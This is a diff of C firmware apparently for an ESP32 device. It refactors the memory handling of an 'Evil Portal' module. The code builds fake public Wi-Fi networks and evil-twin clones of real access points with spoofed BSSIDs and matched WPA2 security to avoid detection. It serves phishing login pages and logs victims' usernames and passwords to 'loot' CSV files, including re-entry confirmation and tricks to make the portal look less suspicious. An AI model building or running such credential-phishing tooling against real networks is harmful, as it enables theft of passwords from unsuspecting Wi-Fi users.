@@ -113,12 +113,13 @@ static const char *SSID_PAT[] = {
     "Biblioteca WiFi", "Camping WiFi", "B&B Free WiFi", "Treno WiFi", "Autogrill Free WiFi",
 };
 #define N_SSID ((int)(sizeof(SSID_PAT)/sizeof(SSID_PAT[0])))
-static char s_ssid_resolved[N_SSID][33];
+static char (*s_ssid_resolved)[33];   // lazy heap on first build_ssid_presets() call
 static bool s_ssid_built;
 
 static void build_ssid_presets(void)
 {
     if (s_ssid_built) return;
+    if (!s_ssid_resolved) { s_ssid_resolved = malloc(N_SSID * 33); if (!s_ssid_resolved) return; }
     uint8_t mac[6] = {0};
     esp_wifi_get_mac(WIFI_IF_AP, mac);               // valid once Wi-Fi is started (boot did this)
     char h6[8], x4[8], d8[16];
@@ -145,14 +146,10 @@ static volatile bool s_running;
 static volatile bool s_dns_run;
 static TaskHandle_t   s_dns_task;
 static httpd_handle_t s_portal;
-static char  s_cur_ssid[33];
-static char  s_logpath[96];              // PORTAL_LOOT/session-<ts<=39>.csv <= 72; sizeof-bounded writer
 static char *s_tpl_html;                 // malloc'd copy of the active template (built-in or SD)
 static volatile int s_captures;
 static int64_t s_start_us;               // arm time, for the live "active for" counter
-static char  s_last_user[96], s_last_pass[96];
 #define RECENT_N 6                        // ring of the latest captures shown in the running UI
-static char  s_recent_u[RECENT_N][64], s_recent_p[RECENT_N][64];
 static int   s_recent_head, s_recent_total;
 static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;   // guards last_*/recent_* under the httpd task
 
@@ -163,27 +160,33 @@ static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;   // guards last_*/rec
 // serves handlers on one task, so this table needs no extra lock.
 #define SEEN_N 8
 typedef struct { char ip[40]; char pass[64]; uint8_t attempts; } seen_t;
-static seen_t s_seen[SEEN_N];
 static int    s_seen_head;
 static volatile int s_confirmed;          // captures confirmed by an identical re-entry
 
-// ---- per-client "satisfied" set (captive-probe dismissal) -------------------
-// IPs that have submitted the credentials we finish on (attempt>=2). A real captive portal, after
-// sign-in, lets that client's connectivity probe SUCCEED so the OS dismisses the "Sign in" sheet and
-// reads as connected. We mirror that per-IP (see serve_success): less suspicious than a sheet stuck
-// open. The httpd serves handlers on one task, so this table needs no extra lock.
 #define SAT_N 8
-static char s_sat[SAT_N][40];
 static int  s_sat_head;
+
+// Large per-session buffers: heap-alloc in start_impl, free in stop. Zero .bss between sessions.
+typedef struct {
+    char cur_ssid[33];
+    char logpath[96];
+    char last_user[96];
+    char last_pass[96];
+    char recent_u[RECENT_N][64];
+    char recent_p[RECENT_N][64];
+    seen_t seen[SEEN_N];
+    char sat[SAT_N][40];
+} ep_run_t;
+static ep_run_t *s_ep;   // NULL at boot; alloc in start_impl, free in stop
 static void mark_satisfied(const char *ip)
 {
-    for (int i = 0; i < SAT_N; i++) if (s_sat[i][0] && strcmp(s_sat[i], ip) == 0) return;
-    snprintf(s_sat[s_sat_head], sizeof s_sat[0], "%s", ip);
+    for (int i = 0; i < SAT_N; i++) if (s_ep->sat[i][0] && strcmp(s_ep->sat[i], ip) == 0) return;
+    snprintf(s_ep->sat[s_sat_head], sizeof s_ep->sat[0], "%s", ip);
     s_sat_head = (s_sat_head + 1) % SAT_N;
 }
 static bool ip_satisfied(const char *ip)
 {
-    for (int i = 0; i < SAT_N; i++) if (s_sat[i][0] && strcmp(s_sat[i], ip) == 0) return true;
+    for (int i = 0; i < SAT_N; i++) if (s_ep->sat[i][0] && strcmp(s_ep->sat[i], ip) == 0) return true;
     return false;
 }
 
@@ -260,14 +263,14 @@ static bool load_template(int idx)
     }
 
     // {{SSID}} substitution. Bound the output so a pathological template can't blow the heap.
-    const char *tok = "{{SSID}}"; int toklen = 8, slen = strlen(s_cur_ssid);
+    const char *tok = "{{SSID}}"; int toklen = 8, slen = strlen(s_ep->cur_ssid);
     int occ = 0; for (const char *p = raw; (p = strstr(p, tok)); p += toklen) occ++;
     long outlen = rawlen + (long)occ * (slen - toklen) + 1;
     if (outlen < 1) outlen = rawlen + 1;
     s_tpl_html = malloc(outlen);
     if (s_tpl_html) {
         char *o = s_tpl_html; const char *p = raw, *m;
-        while ((m = strstr(p, tok))) { memcpy(o, p, m - p); o += m - p; memcpy(o, s_cur_ssid, slen); o += slen; p = m + toklen; }
+        while ((m = strstr(p, tok))) { memcpy(o, p, m - p); o += m - p; memcpy(o, s_ep->cur_ssid, slen); o += slen; p = m + toklen; }
         strcpy(o, p);
     }
     if (raw_owned) free(raw);
@@ -327,14 +330,14 @@ static int seen_note(const char *ip, const char *pass, bool *match)
 {
     *match = false;
     for (int i = 0; i < SEEN_N; i++) {
-        if (s_seen[i].ip[0] && strcmp(s_seen[i].ip, ip) == 0) {
-            *match = (strcmp(s_seen[i].pass, pass) == 0);
-            if (s_seen[i].attempts < 250) s_seen[i].attempts++;
-            snprintf(s_seen[i].pass, sizeof s_seen[i].pass, "%s", pass);
-            return s_seen[i].attempts;
+        if (s_ep->seen[i].ip[0] && strcmp(s_ep->seen[i].ip, ip) == 0) {
+            *match = (strcmp(s_ep->seen[i].pass, pass) == 0);
+            if (s_ep->seen[i].attempts < 250) s_ep->seen[i].attempts++;
+            snprintf(s_ep->seen[i].pass, sizeof s_ep->seen[i].pass, "%s", pass);
+            return s_ep->seen[i].attempts;
         }
     }
-    seen_t *e = &s_seen[s_seen_head];                 // new client -> take a ring slot
+    seen_t *e = &s_ep->seen[s_seen_head];                 // new client -> take a ring slot
     s_seen_head = (s_seen_head + 1) % SEEN_N;
     snprintf(e->ip, sizeof e->ip, "%s", ip);
     snprintf(e->pass, sizeof e->pass, "%s", pass);
@@ -373,11 +376,11 @@ static int capture(const char *client_ip, char *body)
     // Two sinks: the per-session loot file and a cumulative all-credentials.csv (header once).
     FILE *all = fopen(LOOT_ALL, "rb"); bool need_hdr = (all == NULL); if (all) fclose(all);
     FILE *fa = fopen(LOOT_ALL, "a");
-    FILE *fs = s_logpath[0] ? fopen(s_logpath, "a") : NULL;
+    FILE *fs = s_ep->logpath[0] ? fopen(s_ep->logpath, "a") : NULL;
     for (int pass2 = 0; pass2 < 2; pass2++) {
         FILE *f = pass2 ? fs : fa; if (!f) continue;
         if (pass2 == 0 && need_hdr) fprintf(f, "timestamp,ssid,client,user,password,confirmed,raw\n");
-        csv_field(f, ts, false); csv_field(f, s_cur_ssid, false); csv_field(f, client_ip, false);
+        csv_field(f, ts, false); csv_field(f, s_ep->cur_ssid, false); csv_field(f, client_ip, false);
         csv_field(f, user, false); csv_field(f, pass, false);
         csv_field(f, confirmed ? "yes" : "no", false); csv_field(f, raw, true);
     }
@@ -388,10 +391,10 @@ static int capture(const char *client_ip, char *body)
     snprintf(lu, sizeof lu, "%s", user[0] ? user : raw);
     snprintf(lp, sizeof lp, "%s", pass);
     taskENTER_CRITICAL(&s_mux);
-    memcpy(s_last_user, lu, sizeof s_last_user);
-    memcpy(s_last_pass, lp, sizeof s_last_pass);
-    memcpy(s_recent_u[s_recent_head], lu, 64); s_recent_u[s_recent_head][63] = 0;
-    memcpy(s_recent_p[s_recent_head], lp, 64); s_recent_p[s_recent_head][63] = 0;
+    memcpy(s_ep->last_user, lu, sizeof s_ep->last_user);
+    memcpy(s_ep->last_pass, lp, sizeof s_ep->last_pass);
+    memcpy(s_ep->recent_u[s_recent_head], lu, 64); s_ep->recent_u[s_recent_head][63] = 0;
+    memcpy(s_ep->recent_p[s_recent_head], lp, 64); s_ep->recent_p[s_recent_head][63] = 0;
     s_recent_head = (s_recent_head + 1) % RECENT_N;
     s_recent_total++;
     s_captures++;
@@ -704,10 +707,11 @@ static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
 {
     if (s_running) return ESP_OK;
     if (!ssid || !ssid[0]) return ESP_ERR_INVALID_ARG;
-    snprintf(s_cur_ssid, sizeof s_cur_ssid, "%s", ssid);
-    s_captures = 0; s_last_user[0] = s_last_pass[0] = 0;
+    if (!s_ep) { s_ep = calloc(1, sizeof(ep_run_t)); if (!s_ep) return ESP_ERR_NO_MEM; }
+    snprintf(s_ep->cur_ssid, sizeof s_ep->cur_ssid, "%s", ssid);
+    s_captures = 0; s_ep->last_user[0] = s_ep->last_pass[0] = 0;
     s_recent_head = s_recent_total = 0;
-    s_confirmed = 0; memset(s_seen, 0, sizeof s_seen); s_seen_head = 0;
+    s_confirmed = 0; memset(s_ep->seen, 0, sizeof s_ep->seen); s_seen_head = 0;
     s_start_us = esp_timer_get_time();
     s_twin = false; s_twin_frames = 0; s_twin_coherent = false;
 
@@ -730,14 +734,14 @@ static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
     char safe[40]; int j = 0;
     for (const char *p = ts; *p && j < (int)sizeof(safe) - 1; p++) safe[j++] = (*p == ' ' || *p == ':') ? '-' : *p;
     safe[j] = 0;
-    snprintf(s_logpath, sizeof s_logpath, "%s/session-%s.csv", PORTAL_LOOT, safe);
+    snprintf(s_ep->logpath, sizeof s_ep->logpath, "%s/session-%s.csv", PORTAL_LOOT, safe);
 
     // Coherent twin: when cloning an encrypted (non-PMF) AP, advertise the SAME WPA2 security so the
     // beacon identity matches the real one (kills the open-downgrade tell). OPEN/PMF targets stay open.
     bool make_wpa2 = twin && coherent && real_auth != WIFI_AUTH_OPEN && !auth_is_pmf(real_auth);
     s_twin_coherent = make_wpa2;
 
-    esp_err_t err = start_ap(s_cur_ssid, channel, twin ? bssid : NULL, real_auth, make_wpa2);
+    esp_err_t err = start_ap(s_ep->cur_ssid, channel, twin ? bssid : NULL, real_auth, make_wpa2);
     if (err != ESP_OK) { ESP_LOGE(TAG, "AP start failed: %s", esp_err_to_name(err)); nucleo_setup_apply_network(); nucleo_exclusive_exit(); return err; }
     offer_captive_dns();                    // DHCP hands clients 192.168.4.1 as their resolver
 
@@ -765,7 +769,7 @@ static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
     }
 
     s_running = true;
-    ESP_LOGW(TAG, "Evil Portal ARMED: SSID='%s' ch=%d twin=%d loot=%s", s_cur_ssid, channel, (int)s_twin, s_logpath);
+    ESP_LOGW(TAG, "Evil Portal ARMED: SSID='%s' ch=%d twin=%d loot=%s", s_ep->cur_ssid, channel, (int)s_twin, s_ep->logpath);
     return ESP_OK;
 }
 
@@ -950,6 +954,7 @@ void nucleo_evilportal_stop(void)
     for (int i = 0; i < 30 && s_dns_task; i++) vTaskDelay(pdMS_TO_TICKS(50));   // let the DNS task exit
 
     free(s_tpl_html); s_tpl_html = NULL;
+    free(s_ep); s_ep = NULL;
 
     // Put the factory AP MAC back so the OS AP isn't left wearing the spoofed BSSID after a session.
     uint8_t fac[6];
@@ -960,7 +965,6 @@ void nucleo_evilportal_stop(void)
     }
     nucleo_setup_apply_network();          // restore STA/AP from the saved config (network up first)
     nucleo_exclusive_exit();               // restart httpd + mDNS + voice; ANIMA L1 reloads lazily
-    s_cur_ssid[0] = 0;
     ESP_LOGI(TAG, "Evil Portal disarmed; network + OS web UI restored");
 }
 
@@ -969,8 +973,8 @@ bool          nucleo_evilportal_twin(void)         { return s_twin; }
 bool          nucleo_evilportal_twin_coherent(void){ return s_twin_coherent; }
 int           nucleo_evilportal_twin_channel(void) { return s_twin ? s_twin_channel : 0; }
 unsigned long nucleo_evilportal_deauth_frames(void){ return s_twin_frames; }
-const char *nucleo_evilportal_ssid(void)     { return s_cur_ssid; }
-const char *nucleo_evilportal_logpath(void)  { return s_logpath; }
+const char *nucleo_evilportal_ssid(void)     { return s_ep ? s_ep->cur_ssid : ""; }
+const char *nucleo_evilportal_logpath(void)  { return s_ep ? s_ep->logpath : ""; }
 int         nucleo_evilportal_captures(void) { return s_captures; }
 int         nucleo_evilportal_confirmed(void){ return s_confirmed; }
 
@@ -981,8 +985,8 @@ int nucleo_evilportal_clients(void)
     return (esp_wifi_ap_get_sta_list(&list) == ESP_OK) ? list.num : 0;
 }
 
-const char *nucleo_evilportal_last_user(void) { return s_last_user; }
-const char *nucleo_evilportal_last_pass(void) { return s_last_pass; }
+const char *nucleo_evilportal_last_user(void) { return s_ep ? s_ep->last_user : ""; }
+const char *nucleo_evilportal_last_pass(void) { return s_ep ? s_ep->last_pass : ""; }
 
 unsigned nucleo_evilportal_uptime_s(void)
 {
@@ -996,11 +1000,13 @@ int nucleo_evilportal_recent_count(void)
 // i=0 -> most recent. Maps back through the ring head.
 const char *nucleo_evilportal_recent_user(int i)
 {
+    if (!s_ep) return "";
     int n = nucleo_evilportal_recent_count(); if (i < 0 || i >= n) return "";
-    return s_recent_u[(s_recent_head - 1 - i + 2 * RECENT_N) % RECENT_N];
+    return s_ep->recent_u[(s_recent_head - 1 - i + 2 * RECENT_N) % RECENT_N];
 }
 const char *nucleo_evilportal_recent_pass(int i)
 {
+    if (!s_ep) return "";
     int n = nucleo_evilportal_recent_count(); if (i < 0 || i >= n) return "";
-    return s_recent_p[(s_recent_head - 1 - i + 2 * RECENT_N) % RECENT_N];
+    return s_ep->recent_p[(s_recent_head - 1 - i + 2 * RECENT_N) % RECENT_N];
 }
